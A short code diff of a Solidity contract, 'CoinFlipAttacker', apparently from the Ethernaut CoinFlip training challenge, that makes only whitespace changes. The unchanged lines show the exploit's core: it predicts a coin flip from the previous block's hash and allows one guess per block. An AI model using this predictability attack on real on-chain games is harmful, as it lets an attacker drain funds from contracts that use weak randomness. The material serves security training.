@@ -10,12 +10,12 @@ contract CoinFlipAttacker {
 
     error CanOnceExecuteOncePerBlock();
 
-    constructor(address coinFlipAddress){
+    constructor(address coinFlipAddress) {
         coinFlip = CoinFlip(coinFlipAddress);
     }
 
-    function cheatGuess() external returns (bool){
-        if(lastBlockNumber >= block.number){
+    function cheatGuess() external returns (bool) {
+        if (lastBlockNumber >= block.number) {
             revert CanOnceExecuteOncePerBlock();
         }
         uint256 value = uint256(blockhash(block.number - 1)) / FACTOR;
